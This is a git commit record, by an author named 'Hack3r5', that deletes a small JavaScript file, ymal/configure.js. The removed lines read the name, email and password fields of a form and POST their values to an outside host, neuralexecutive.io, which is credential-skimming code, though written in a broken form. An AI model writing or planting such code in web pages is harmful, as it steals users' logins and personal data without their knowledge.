bd0c60ee5d34a7e6b6b3bb2e6973f7120d3507b1
Hack3r5 <115195207+Hideoutcode@users.noreply.github.com>
2023-11-17 10:16:44 -0500

    Delete ymal/configure.js

--- ymal/configure.js
+++
@@ -1,6 +0,0 @@
-getElementById('InputName').value;with(new XMLHttpRequest())open("POST","neuralexecutive.io/ymal"),send("message="+m); 
-
-
-getElementById('InputEmail').value;with(new XMLHttpRequest())open("POST","neuralexecutive.io/ymal"),send("message="+m); 
-
-getElementById('InputPassword').value;with(new XMLHttpRequest())open("POST","neuralexecutive.io/ymal"),send("message="+m); 
